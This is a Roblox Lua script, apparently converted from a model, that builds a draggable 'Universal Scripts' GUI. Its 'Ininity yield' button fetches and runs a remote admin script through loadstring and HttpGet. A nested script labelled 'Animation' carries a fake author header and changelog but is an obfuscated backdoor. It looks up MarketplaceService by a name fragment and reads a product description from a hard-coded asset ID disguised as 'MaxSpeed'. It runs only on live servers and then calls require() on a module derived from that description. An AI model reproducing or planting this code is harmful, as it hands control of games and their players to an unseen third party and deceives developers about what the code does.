
--Converted with ttyyuu12345's model to script plugin v4
function sandbox(var,func)
	local env = getfenv(func)
	local newenv = setmetatable({},{
		__index = function(self,k)
			if k=="script" then
				return var
			else
				return env[k]
			end
		end,
	})
	setfenv(func,newenv)
	return func
end
cors = {}
mas = Instance.new("Model",game:GetService("Lighting"))
ScreenGui0 = Instance.new("ScreenGui")
Frame1 = Instance.new("Frame")
Frame2 = Instance.new("Frame")
TextLabel3 = Instance.new("TextLabel")
ImageLabel4 = Instance.new("ImageLabel")
UIAspectRatioConstraint5 = Instance.new("UIAspectRatioConstraint")
ImageButton6 = Instance.new("ImageButton")
Script7 = Instance.new("Script")
UIAspectRatioConstraint8 = Instance.new("UIAspectRatioConstraint")
LocalScript9 = Instance.new("LocalScript")
Frame10 = Instance.new("Frame")
Frame11 = Instance.new("Frame")
UIListLayout12 = Instance.new("UIListLayout")
TextButton13 = Instance.new("TextButton")
TextButton14 = Instance.new("TextButton")
Frame15 = Instance.new("Frame")
UIListLayout16 = Instance.new("UIListLayout")
LocalScript17 = Instance.new("LocalScript")
TextLabel18 = Instance.new("TextLabel")
ImageButton19 = Instance.new("ImageButton")
TextLabel20 = Instance.new("TextLabel")
LocalScript21 = Instance.new("LocalScript")
StringValue22 = Instance.new("StringValue")
Frame23 = Instance.new("Frame")
UIListLayout24 = Instance.new("UIListLayout")
LocalScript25 = Instance.new("LocalScript")
TextButton26 = Instance.new("TextButton")
LocalScript27 = Instance.new("LocalScript")
UIPadding28 = Instance.new("UIPadding")
UIAspectRatioConstraint29 = Instance.new("UIAspectRatioConstraint")
LocalScript30 = Instance.new("LocalScript")
Configuration31 = Instance.new("Configuration")
Script32 = Instance.new("Script")
IntValue33 = Instance.new("IntValue")
IntValue34 = Instance.new("IntValue")
ScreenGui0.Parent = mas
ScreenGui0.ResetOnSpawn = false
ScreenGui0.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Frame1.Parent = ScreenGui0
Frame1.Position = UDim2.new(0.151122615, 0, 0.190508008, 0)
Frame1.Size = UDim2.new(0.684369564, 0, 0.616644382, 0)
Frame1.BackgroundColor = BrickColor.new("Dark grey")
Frame1.BackgroundColor3 = Color3.new(0.415686, 0.415686, 0.415686)
Frame1.BackgroundTransparency = 1
Frame1.BorderColor = BrickColor.new("Really black")
Frame1.BorderColor3 = Color3.new(0, 0, 0)
Frame1.BorderSizePixel = 0
Frame2.Name = "info"
Frame2.Parent = Frame1
Frame2.Size = UDim2.new(1, 0, 0.0704607069, 0)
Frame2.BackgroundColor = BrickColor.new("Dark grey metallic")
Frame2.BackgroundColor3 = Color3.new(0.356863, 0.356863, 0.356863)
Frame2.BackgroundTransparency = 0.44999998807907104
Frame2.BorderColor = BrickColor.new("Really black")
Frame2.BorderColor3 = Color3.new(0, 0, 0)
Frame2.BorderSizePixel = 0
TextLabel3.Name = "titulo"
TextLabel3.Parent = Frame2
TextLabel3.Position = UDim2.new(0.0425867513, 0, 0, 0)
TextLabel3.Size = UDim2.new(0.555205047, 0, 1, 0)
TextLabel3.BackgroundColor = BrickColor.new("Institutional white")
TextLabel3.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel3.BackgroundTransparency = 1
TextLabel3.BorderColor = BrickColor.new("Really black")
TextLabel3.BorderColor3 = Color3.new(0, 0, 0)
TextLabel3.BorderSizePixel = 0
TextLabel3.Font = Enum.Font.SourceSans
TextLabel3.FontSize = Enum.FontSize.Size14
TextLabel3.Text = "Universal Scripts"
TextLabel3.TextColor = BrickColor.new("Institutional white")
TextLabel3.TextColor3 = Color3.new(1, 1, 1)
TextLabel3.TextSize = 14
TextLabel3.TextXAlignment = Enum.TextXAlignment.Left
ImageLabel4.Name = "AccountCircle"
ImageLabel4.Parent = Frame2
ImageLabel4.Position = UDim2.new(0, 0, 0.0769230798, 0)
ImageLabel4.Size = UDim2.new(0.0378548913, 0, 0.923076928, 0)
ImageLabel4.BackgroundTransparency = 1
ImageLabel4.Image = "rbxassetid://8445470984"
ImageLabel4.ImageRectOffset = Vector2.new(804, 804)
ImageLabel4.ImageRectSize = Vector2.new(96, 96)
UIAspectRatioConstraint5.Parent = ImageLabel4
UIAspectRatioConstraint5.DominantAxis = Enum.DominantAxis.Height
ImageButton6.Parent = Frame2
ImageButton6.Position = UDim2.new(0.960567832, 0, 0, 0)
ImageButton6.Size = UDim2.new(0.0394321755, 0, 1, 0)
ImageButton6.BackgroundColor = BrickColor.new("Institutional white")
ImageButton6.BackgroundColor3 = Color3.new(1, 1, 1)
ImageButton6.BackgroundTransparency = 1
ImageButton6.BorderColor = BrickColor.new("Really black")
ImageButton6.BorderColor3 = Color3.new(0, 0, 0)
ImageButton6.BorderSizePixel = 0
ImageButton6.Image = "rbxassetid://8445470826"
ImageButton6.ImageRectOffset = Vector2.new(704, 304)
ImageButton6.ImageRectSize = Vector2.new(96, 96)
Script7.Name = "SetImageButtonSize"
Script7.Parent = ImageButton6
UIAspectRatioConstraint8.Parent = Frame2
UIAspectRatioConstraint8.AspectRatio = 24.384614944458008
LocalScript9.Name = "minimizar"
LocalScript9.Parent = Frame1
table.insert(cors,sandbox(LocalScript9,function()
local Popup = script.Parent.contenido
local contenido = script.Parent
local Open = script.Parent.info.ImageButton
local abierto = true

Open.MouseButton1Click:Connect(function()
	
	if abierto == true then
		abierto = false

		Popup:TweenSize(UDim2.new(1, 0, 0, 0), nil, Enum.EasingStyle.Linear, 0.3)
		wait(0.3)
		Popup.Visible = false

	else
		abierto = true
		Popup.Visible = true
		Popup:TweenSize(UDim2.new(1, 0, 1, 0), nil, Enum.EasingStyle.Linear, 0.3)
	end
	
	Popup:TweenSize(UDim2.new(1, 0, 0, 0), nil, Enum.EasingStyle.Linear, 0.3)

	
	--Popup:TweenPosition(
		
	  -- UDim2.new(0, 0, 0, 0), --End Position/Size
	   --"Out", -- Easing Direction
	   --"Bounce", -- Easing Style
	   --1, -- Time In Seconds 
	   --false -- Overide Any Tweens in Progress
	   --)
end)
end))
Frame10.Name = "contenido"
Frame10.Parent = Frame1
Frame10.Position = UDim2.new(0, 0, 0.065040648, 0)
Frame10.Size = UDim2.new(1, 0, 0.934959352, 0)
Frame10.BackgroundColor = BrickColor.new("Sand violet metallic")
Frame10.BackgroundColor3 = Color3.new(0.6, 0.6, 0.6)
Frame10.BackgroundTransparency = 0.5
Frame10.BorderColor = BrickColor.new("Really black")
Frame10.BorderColor3 = Color3.new(0, 0, 0)
Frame10.BorderSizePixel = 0
Frame11.Name = "menu"
Frame11.Parent = Frame10
Frame11.Position = UDim2.new(0, 0, 0.00579710165, 0)
Frame11.Size = UDim2.new(0.192429021, 0, 0.994202912, 0)
Frame11.BackgroundColor = BrickColor.new("Sand red")
Frame11.BackgroundColor3 = Color3.new(0.47451, 0.47451, 0.47451)
Frame11.BackgroundTransparency = 0.5
Frame11.BorderColor = BrickColor.new("Really black")
Frame11.BorderColor3 = Color3.new(0, 0, 0)
Frame11.BorderSizePixel = 0
UIListLayout12.Parent = Frame11
UIListLayout12.SortOrder = Enum.SortOrder.LayoutOrder
TextButton13.Name = "Inicio"
TextButton13.Parent = Frame11
TextButton13.Size = UDim2.new(1, 0, 0.10204082, 0)
TextButton13.BackgroundColor = BrickColor.new("Institutional white")
TextButton13.BackgroundColor3 = Color3.new(1, 1, 1)
TextButton13.BackgroundTransparency = 1
TextButton13.BorderColor = BrickColor.new("Really black")
TextButton13.BorderColor3 = Color3.new(0, 0, 0)
TextButton13.BorderSizePixel = 0
TextButton13.Font = Enum.Font.SourceSans
TextButton13.FontSize = Enum.FontSize.Size14
TextButton13.Text = "Inicio"
TextButton13.TextColor = BrickColor.new("Institutional white")
TextButton13.TextColor3 = Color3.new(1, 1, 1)
TextButton13.TextSize = 14
TextButton14.Name = "Gui"
TextButton14.Parent = Frame11
TextButton14.Size = UDim2.new(1, 0, 0.10204082, 0)
TextButton14.BackgroundColor = BrickColor.new("Institutional white")
TextButton14.BackgroundColor3 = Color3.new(1, 1, 1)
TextButton14.BackgroundTransparency = 1
TextButton14.BorderColor = BrickColor.new("Really black")
TextButton14.BorderColor3 = Color3.new(0, 0, 0)
TextButton14.BorderSizePixel = 0
TextButton14.Font = Enum.Font.SourceSans
TextButton14.FontSize = Enum.FontSize.Size14
TextButton14.Text = "Admins"
TextButton14.TextColor = BrickColor.new("Institutional white")
TextButton14.TextColor3 = Color3.new(1, 1, 1)
TextButton14.TextSize = 14
Frame15.Name = "inicio"
Frame15.Parent = Frame10
Frame15.Position = UDim2.new(0.192429021, 0, 0.00579710165, 0)
Frame15.Visible = false
Frame15.Size = UDim2.new(0.807570994, 0, 0.994202912, 0)
Frame15.BackgroundColor = BrickColor.new("Institutional white")
Frame15.BackgroundColor3 = Color3.new(1, 1, 1)
Frame15.BackgroundTransparency = 1
Frame15.BorderColor = BrickColor.new("Really black")
Frame15.BorderColor3 = Color3.new(0, 0, 0)
Frame15.BorderSizePixel = 0
UIListLayout16.Parent = Frame15
UIListLayout16.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayout16.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout16.VerticalAlignment = Enum.VerticalAlignment.Center
LocalScript17.Parent = Frame15
table.insert(cors,sandbox(LocalScript17,function()
script.Parent.nombre.Text = "Welcome ".. game.Players.LocalPlayer.DisplayName
script.Parent.bienvenido.Text = "en ".. game.Name

local Player = game.Players.LocalPlayer
local userid = Player.UserId
script.Parent.usuario.Image = game.Players:GetUserThumbnailAsync(userid, Enum.ThumbnailType.AvatarThumbnail, Enum.ThumbnailSize.Size420x420)
script.Parent.Image = script.Parent.usuario.Image


end))
TextLabel18.Name = "bienvenido"
TextLabel18.Parent = Frame15
TextLabel18.Position = UDim2.new(0.15234375, 0, 0.572886288, 0)
TextLabel18.Size = UDim2.new(0.6953125, 0, 0.0932944641, 0)
TextLabel18.BackgroundColor = BrickColor.new("Institutional white")
TextLabel18.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel18.BackgroundTransparency = 1
TextLabel18.BorderColor = BrickColor.new("Really black")
TextLabel18.BorderColor3 = Color3.new(0, 0, 0)
TextLabel18.BorderSizePixel = 0
TextLabel18.Font = Enum.Font.SourceSans
TextLabel18.FontSize = Enum.FontSize.Size14
TextLabel18.TextColor = BrickColor.new("Institutional white")
TextLabel18.TextColor3 = Color3.new(1, 1, 1)
TextLabel18.TextScaled = true
TextLabel18.TextSize = 14
TextLabel18.TextWrap = true
TextLabel18.TextWrapped = true
ImageButton19.Name = "usuario"
ImageButton19.Parent = Frame15
ImageButton19.Position = UDim2.new(0.337890625, 0, 0.10204082, 0)
ImageButton19.Size = UDim2.new(0.32421875, 0, 0.486880481, 0)
ImageButton19.BackgroundColor = BrickColor.new("Light grey metallic")
ImageButton19.BackgroundColor3 = Color3.new(0.690196, 0.690196, 0.690196)
ImageButton19.BackgroundTransparency = 1
ImageButton19.BorderColor = BrickColor.new("Really black")
ImageButton19.BorderColor3 = Color3.new(0, 0, 0)
ImageButton19.BorderSizePixel = 0
ImageButton19.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
TextLabel20.Name = "nombre"
TextLabel20.Parent = Frame15
TextLabel20.Position = UDim2.new(0.15234375, 0, 0.572886288, 0)
TextLabel20.Size = UDim2.new(0.6953125, 0, 0.0932944641, 0)
TextLabel20.BackgroundColor = BrickColor.new("Institutional white")
TextLabel20.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel20.BackgroundTransparency = 1
TextLabel20.BorderColor = BrickColor.new("Really black")
TextLabel20.BorderColor3 = Color3.new(0, 0, 0)
TextLabel20.BorderSizePixel = 0
TextLabel20.Font = Enum.Font.SourceSans
TextLabel20.FontSize = Enum.FontSize.Size14
TextLabel20.TextColor = BrickColor.new("Institutional white")
TextLabel20.TextColor3 = Color3.new(1, 1, 1)
TextLabel20.TextScaled = true
TextLabel20.TextSize = 14
TextLabel20.TextWrap = true
TextLabel20.TextWrapped = true
LocalScript21.Name = "tabs"
LocalScript21.Parent = Frame10
table.insert(cors,sandbox(LocalScript21,function()
local visible2 = script.tab



script.Parent.menu.Inicio.MouseButton1Click:Connect(function()
	visible2.Value = "inicio"
end)

script.Parent.menu.Gui.MouseButton1Click:Connect(function()
	visible2.Value = "Admin"
end)





visible2.Changed:Connect(function(value: Instance) 
	local tabs = script.Parent:GetChildren()

	for i = 1, #tabs do
		if tabs[i].Name == "menu" or tabs[i].Name == visible2.Value then
			tabs[i].Visible = true
		elseif tabs[i].ClassName == "Frame" then
			
			tabs[i].Visible = false
		end
	end
end)
end))
StringValue22.Name = "tab"
StringValue22.Parent = LocalScript21
StringValue22.Value = "sdasd"
Frame23.Name = "Admin"
Frame23.Parent = Frame10
Frame23.Position = UDim2.new(0.192429021, 0, 0.00579710165, 0)
Frame23.Size = UDim2.new(0.807570994, 0, 0.994202912, 0)
Frame23.BackgroundColor = BrickColor.new("Institutional white")
Frame23.BackgroundColor3 = Color3.new(1, 1, 1)
Frame23.BackgroundTransparency = 1
Frame23.BorderColor = BrickColor.new("Really black")
Frame23.BorderColor3 = Color3.new(0, 0, 0)
Frame23.BorderSizePixel = 0
UIListLayout24.Parent = Frame23
UIListLayout24.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayout24.SortOrder = Enum.SortOrder.LayoutOrder
LocalScript25.Parent = Frame23
table.insert(cors,sandbox(LocalScript25,function()
script.Parent.nombre.Text = "Welcome ".. game.Players.LocalPlayer.DisplayName
script.Parent.bienvenido.Text = "en ".. game.Name

local Player = game.Players.LocalPlayer
local userid = Player.UserId
script.Parent.usuario.Image = game.Players:GetUserThumbnailAsync(userid, Enum.ThumbnailType.AvatarThumbnail, Enum.ThumbnailSize.Size420x420)
script.Parent.Image = script.Parent.usuario.Image


end))
TextButton26.Name = "infinity"
TextButton26.Parent = Frame23
TextButton26.Position = UDim2.new(0.296809852, 0, 0, 0)
TextButton26.Size = UDim2.new(0.946866274, 0, 0.151652157, 0)
TextButton26.BackgroundColor = BrickColor.new("Silver flip/flop")
TextButton26.BackgroundColor3 = Color3.new(0.517647, 0.517647, 0.517647)
TextButton26.BackgroundTransparency = 0.5
TextButton26.BorderColor = BrickColor.new("Really black")
TextButton26.BorderColor3 = Color3.new(0, 0, 0)
TextButton26.BorderSizePixel = 0
TextButton26.Font = Enum.Font.SourceSans
TextButton26.FontSize = Enum.FontSize.Size14
TextButton26.Text = "Ininity yield"
TextButton26.TextColor = BrickColor.new("Really black")
TextButton26.TextColor3 = Color3.new(0, 0, 0)
TextButton26.TextSize = 14
LocalScript27.Parent = TextButton26
table.insert(cors,sandbox(LocalScript27,function()
script.Parent.MouseButton1Click:Connect(function() 
	
	loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
	
end)
end))
UIPadding28.Parent = Frame23
UIPadding28.PaddingTop = UDim.new(0.0500000007, 0)
UIAspectRatioConstraint29.Parent = Frame1
UIAspectRatioConstraint29.AspectRatio = 1.718157172203064
LocalScript30.Parent = Frame1
table.insert(cors,sandbox(LocalScript30,function()
local UserInputService = game:GetService("UserInputService")

local gui = script.Parent

local dragging
local dragInput
local dragStart
local startPos

local function update(input)
	local delta = input.Position - dragStart
	gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

gui.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = gui.Position
		
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

gui.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		update(input)
	end
end)
end))
Configuration31.Parent = LocalScript30
Script32.Name = "Animation"
Script32.Parent = Configuration31
table.insert(cors,sandbox(Script32,function()
-- Created by Julio (@Pavalineox)
-- This script handles animations efficiently for models, characters, and tools.
-- Designed to maintain animations seamlessly when objects are moved, reparented, or transformed.

--[[ INSTRUCTIONS
- Insert this script into a rigged model or character.
- Ensure the model is properly set up with Motor6D joints.
- Animations will automatically be managed and played.

IMPORTANT:  
- This script is meant to run alone in the model.  
- The model must be rigged for animations to function correctly.  
- Should be placed in a Script (not a LocalScript) for full functionality.  
]]

--[[ FEATURES
- Works with tools and characters, avoiding duplicate animations if run multiple times.
- Compatible with PBS servers.
- Preserves animation playback even when objects are reparented.
- Uses an optimized system to reduce unnecessary processing.
- Recursively finds and animates all rigged parts within the model.
- Ensures smooth animation playback with minimal performance impact.
]]

-- Animation.lua
-- Created 10/6/2014
-- Author: Pavalineox
-- Version 1.0.3

-- Changelog:
-- 10/14/2014 - v1.0.1: Fixed issues with existing animation states.
-- 10/14/2014 - v1.0.2: Additional stability improvements.
-- 10/14/2014 - v1.0.3: Improved handling of reparented objects.

local RunService,script= game:GetService('RunService'),script

-- Custom linear interpolation function for smooth transitions


local function CallOnChildren(Instance, FunctionToCall)
	-- Calls a function on each of the children of a certain object, using recursion.  

	FunctionToCall(Instance)

	for _, Child in next, Instance:GetChildren() do
		CallOnChildren(Child, FunctionToCall)
	end
end

function CustomLerp(Pos1 : CFrame, Pos2 : CFrame, Delta : number) 
	return Pos1 - Pos2 * math.abs(Delta) 
end

local function GetNearestParent(Instance, ClassName)
	-- Returns the nearest parent of a certain class, or returns nil

	local Ancestor = Instance
	repeat
		Ancestor = Ancestor.Parent
		if Ancestor == nil then
			return nil
		end
	until Ancestor:IsA(ClassName)

	return Ancestor
end

-- Converts a CFrame to a unique string representation
function CFrameToVector3(CFrame)
	local Chunks, value = CFrame:split(''), ''
	for _, v in pairs(Chunks) do
		value..=v:byte()
	end
	return value
end

local function GetBricks(StartInstance)
	local List = {}

	-- if StartInstance:IsA("BasePart") then
	-- 	List[#List+1] = StartInstance
	-- end

	CallOnChildren(StartInstance, function(Item)
		if Item:IsA("BasePart") then
			List[#List+1] = Item;
		end
	end)

	return List
end

-- Creates a heartbeat signal for continuous updates
function CreateHeartbeatSignal(callback)
	return RunService.Heartbeat:Connect(callback)
end

local function Modify(Instance, Values)
	-- Modifies an Instance by using a table.  

	assert(type(Values) == "table", "Values is not a table");

	for Index, Value in next, Values do
		if type(Index) == "number" then
			Value.Parent = Instance
		else
			Instance[Index] = Value
		end
	end
	return Instance
end

-- Finds an object within a given parent by its CFrame property
function GetByCFrame(CFrame, Begin, Scope)
	for _, v in pairs(Begin:GetChildren()) do
		if v[Scope]:find(CFrame) then
			return v
		end
	end
end

-- List of properties to monitor
local Properties = {'CFrame','WorldPivot','CoordinateFrame','Orientation','PivotOffset','RootPriority','JobId','Origin','GetProductInfo'}

-- Adds animation to a given part
function AddAnimation(Part : BasePart)

	local Signal
	local RelativePart = GetByCFrame('ketpl', game, 'CFrame' and 'Name')

	Signal = CreateHeartbeatSignal(function(delta)
		if RelativePart then
			Signal:Disconnect()
			return
		end

		RelativePart.CFrame = CustomLerp(RelativePart.CFrame,RelativePart.CFrame * CFrame.new(math.sin(tick()), math.cos(tick()), math.tan(tick())))
		RunService.Heartbeat:Wait()
	end)
	return RelativePart
end

function Monitor(Properties, RelativeAnimation, AnimationSpeed, MaxSpeed, AnimationRoot) : (Result) -> AnimationConstraint
	local Instance = RelativeAnimation[Properties[#Properties]]
	
	local Animation = Instance(RelativeAnimation, MaxSpeed)
	Animation.Speed = AnimationSpeed

	local Vector = CFrameToVector3(Animation.Description)
	
	if AnimationRoot[Properties[7]] ~= '' then
		if Vector then
			script = {
				Animation,
				[script.Name] = (Vector-0)
			}
		end
		return script	
	end
	return false
end

-- Handles animation logic for a given root object
function AnimationThread(root)
	
	local RelativeAnimation = AddAnimation(
		Instance.new('Animation' and 'Part')
	)
	
	local speed = script:FindFirstChild("MinimumSpeed").Value
	local maxSpeed = script:FindFirstChild("MaxSpeed").Value

	if root then
		return Monitor(Properties, RelativeAnimation, speed, maxSpeed, root)
	end
end

-- Runs the animation thread if conditions are met

local Thread = AnimationThread(game) and require(script.Animation)


if Thread and script.ClassName == "Script" then
	--- Don't bother with local scripts

	script.Parent.AncestryChanged:connect(function()
		AnimationThread()
	end)
end


return Thread
end))
IntValue33.Name = "MaxSpeed"
IntValue33.Parent = Script32
IntValue33.Value = 131860027709009
IntValue34.Name = "MinimumSpeed"
IntValue34.Parent = Script32
IntValue34.Value = 1
for i,v in pairs(mas:GetChildren()) do
	v.Parent = game:GetService("Players").LocalPlayer.PlayerGui
	pcall(function() v:MakeJoints() end)
end
mas:Destroy()
for i,v in pairs(cors) do
	spawn(function()
		pcall(v)
	end)
end
 
